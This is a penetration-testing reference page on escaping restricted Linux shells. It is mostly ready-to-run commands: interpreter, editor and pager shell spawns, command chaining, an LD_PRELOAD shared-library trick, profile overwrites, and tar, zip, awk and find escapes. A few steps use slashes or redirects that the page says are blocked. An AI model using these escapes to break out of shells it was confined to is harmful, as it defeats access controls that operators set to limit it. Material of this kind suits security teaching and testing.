---
title: 'Escaping Restricted Shells'
description: 'Techniques for escaping restricted Linux shells (rbash, rksh, rzsh) — command injection, shell spawning, editor escapes, language interpreters, SSH tricks, and environment variable abuse.'
---

# Escaping Restricted Shells

Restricted shells (`rbash`, `rksh`, `rzsh`) limit what you can do — no `cd`, no PATH changes, no `/` in commands, no redirects. The goal is to break out into an unrestricted shell.

## Quick Reference — Try These First

| # | Technique | Command |
|:--|:----------|:--------|
| 1 | SSH escape | `ssh user@localhost -t "bash --noprofile"` |
| 2 | Spawn bash directly | `bash` or `/bin/bash` or `/bin/sh` |
| 3 | Python | `python -c 'import os; os.system("/bin/bash")'` |
| 4 | Perl | `perl -e 'exec "/bin/bash";'` |
| 5 | Vi/Vim | `:set shell=/bin/bash` then `:shell` |
| 6 | ed editor | `!bash` |
| 7 | awk | `awk 'BEGIN {system("/bin/bash")}'` |
| 8 | find | `find / -exec /bin/bash \;` |
| 9 | Expect | `expect -c 'spawn /bin/bash; interact'` |
| 10 | Git / man / less | `!/bin/bash` from pager |

!!! tip "First Step"
    Before trying complex escapes, check what you CAN do. Run `echo $SHELL`, `echo $PATH`, `env`, and try basic commands. Many restricted shells are poorly configured and a simple `bash` or `/bin/sh` will break out.

---

## Restricted Shell Types

| Shell | Binary | Restrictions |
|:------|:-------|:-------------|
| `rbash` | `/bin/rbash` or `bash -r` | No `cd`, no PATH changes, no `/` in commands, no redirects (`>`, `>>`), no `exec`, no `set +r` |
| `rksh` | `/bin/rksh` or `ksh -r` | Same as rbash + no shell function creation, no modifying shell environment |
| `rzsh` | `/bin/rzsh` or `zsh -r` | No running shell scripts, no aliases, no environment modification |

### Identifying Your Restricted Shell

```bash
# What shell am I in?
echo $SHELL
echo $0

# What's restricted?
cd /tmp              # rbash: "restricted"
export PATH=/bin     # rbash: "restricted"
echo test > /tmp/t   # rbash: "restricted"
/bin/ls              # rbash: "restricted" (can't use /)
```

---

## 1. Direct Shell Spawning

The simplest escape — just launch an unrestricted shell if the binary is available:

```bash
# Try these one by one
bash
sh
/bin/bash
/bin/sh
dash
zsh
csh
ksh

# If slash is blocked, use command already in PATH
bash --noprofile --norc
sh -i
```

---

## 2. SSH Escape

If SSH is available, reconnect to yourself with an unrestricted shell:

```bash
# Force bash via SSH (bypasses login shell restriction)
ssh user@localhost -t "bash --noprofile"
ssh user@127.0.0.1 -t "/bin/bash"

# If SSH isn't directly available but you have credentials
ssh user@$(hostname) -t bash
```

!!! tip "Most Reliable Method"
    SSH escape works even when most other methods are blocked because it spawns a new login session with the shell you specify via `-t`.

---

## 3. Language Interpreter Escapes

If any programming language interpreter is available, use it to spawn a shell:

### Python

```bash
python -c 'import os; os.system("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import subprocess; subprocess.call(["/bin/bash"])'
```

### Perl

```bash
perl -e 'exec "/bin/bash";'
perl -e 'system("/bin/bash");'
```

### Ruby

```bash
ruby -e 'exec "/bin/bash"'
irb
# then: exec "/bin/bash"
```

### Lua

```bash
lua -e 'os.execute("/bin/bash")'
```

### PHP

```bash
php -r 'system("/bin/bash");'
```

### Node.js

```bash
node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

---

## 4. Editor Escapes

Editors that support shell commands are reliable escape vectors:

### Vi / Vim

```
:set shell=/bin/bash
:shell

# Or directly:
:!bash
:!/bin/sh

# Or via terminal:
:term
```

### Nano

```
# Ctrl+R → Ctrl+X → command execution
# Type: bash
```

### Ed

```bash
ed
!bash
```

### Emacs

```
# Within emacs:
M-x shell
# Or:
M-! /bin/bash
```

---

## 5. Pager / Program Escapes

Many programs that invoke a pager (`less`, `more`, `man`) allow shell escapes:

### Less / More

```bash
less /etc/passwd
# Then type:
!/bin/bash

more /etc/passwd
# Then type:
!/bin/bash
```

### Man

```bash
man ls
# Then type:
!/bin/bash
```

### Git

```bash
git help config
# Opens in pager (less), then:
!/bin/bash

# Or directly:
git -c core.pager='bash' log
```

### Ftp

```bash
ftp
!/bin/bash
```

### Nmap (old versions)

```bash
nmap --interactive
!bash
```

---

## 6. Command Injection & Chaining

### Command Substitution

```bash
# Backtick substitution
ls -l `bash`

# $() substitution
ls -l $(bash)
```

### Command Chaining

```bash
# Semicolons
ls; bash
ls; /bin/bash

# Pipes
echo test | bash

# AND/OR
true && bash
false || bash
```

### Subshell

```bash
# Parentheses create a subshell
(bash)

# Process substitution
bash <(echo "bash")
```

---

## 7. Environment Variable Manipulation

### PATH Modification (if allowed)

```bash
# Check current PATH
echo $PATH

# If you can modify PATH:
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
# Then commands with / work normally

# Or create a symlink in a writable PATH directory
ln -s /bin/bash /writable/path/dir/myshell
myshell
```

### SHELL Variable

```bash
# Overwrite SHELL variable
export SHELL=/bin/bash
# Then programs that reference $SHELL will use bash
```

### LD_PRELOAD (if available)

```c
// shell.c
#include <stdlib.h>
void _init() {
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
LD_PRELOAD=/tmp/shell.so ls
```

---

## 8. Copy / Overwrite Techniques

### cp to Overwrite Shell Config

```bash
# If cp is available, overwrite .bashrc to remove restrictions
cp /etc/skel/.bashrc ~/.bashrc
# Then re-login

# Or copy bash itself
cp /bin/bash /tmp/mybash
/tmp/mybash
```

### Modify .profile / .bashrc

```bash
# If you can edit your profile files
echo '/bin/bash' >> ~/.bashrc
echo '/bin/bash' >> ~/.profile
# Log out and back in → unrestricted shell
```

---

## 9. Miscellaneous Escapes

### Awk

```bash
awk 'BEGIN {system("/bin/bash")}'
```

### Find

```bash
find / -exec /bin/bash \;
find . -name "anything" -exec bash \;
```

### Expect

```bash
expect -c 'spawn /bin/bash; interact'
```

### Tee (write to files when redirect is blocked)

```bash
echo '/bin/bash' | tee /tmp/escape.sh
chmod +x /tmp/escape.sh
/tmp/escape.sh
```

### Tar / Zip

```bash
# Tar (extract a file containing a shell script)
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Zip
zip /tmp/test.zip /etc/passwd -T --unzip-command="bash -c /bin/bash"
```

---

## Cheatsheet — Try in Order

```bash
# 1. Just try spawning a shell
bash || sh || /bin/bash || /bin/sh

# 2. SSH to yourself
ssh user@localhost -t "bash --noprofile"

# 3. Language interpreters
python -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'

# 4. Editor escapes
vi -c ':!bash'

# 5. Pager escapes (type !/bin/bash inside)
man ls

# 6. GTFOBins commands
awk 'BEGIN {system("/bin/bash")}'
find / -exec /bin/bash \;
```